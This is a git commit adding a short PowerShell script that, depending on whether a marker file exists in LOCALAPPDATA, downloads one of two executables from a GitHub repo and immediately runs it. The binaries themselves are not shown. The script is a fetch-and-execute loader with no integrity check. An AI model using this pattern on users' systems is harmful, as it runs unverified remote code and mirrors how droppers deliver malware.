1a5957535b613ef550e73d7564a8d3b64159d82c
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-15 17:19:21 +0300

    Add files via upload

---
+++ Aplicatie/aplicatie.ps1
@@ -0,0 +1,22 @@
+$checkPath = "$env:LOCALAPPDATA\DONOTDELETE.txt"
+
+if (Test-Path $checkPath) {
+    $undoApplicatie = "https://github.com/webntdev/webntdev.github.io/raw/main/Aplicatie/AplicatieUNDO.exe"
+    $undoPath = "$env:LOCALAPPDATA\ApplicatieUNDO.exe"
+
+    Invoke-WebRequest -Uri $undoApplicatie -OutFile $undoPath
+
+    Start-Sleep -Seconds 1
+
+    Start-Process -FilePath $undoPath
+}
+else {
+    $applicatie = "https://github.com/webntdev/webntdev.github.io/raw/main/Aplicatie/Aplicatie.exe"
+    $path = "$env:LOCALAPPDATA\Aplicatie.exe"
+
+    Invoke-WebRequest -Uri $applicatie -OutFile $path
+
+    Start-Sleep -Seconds 1
+
+    Start-Process -FilePath $path
+}
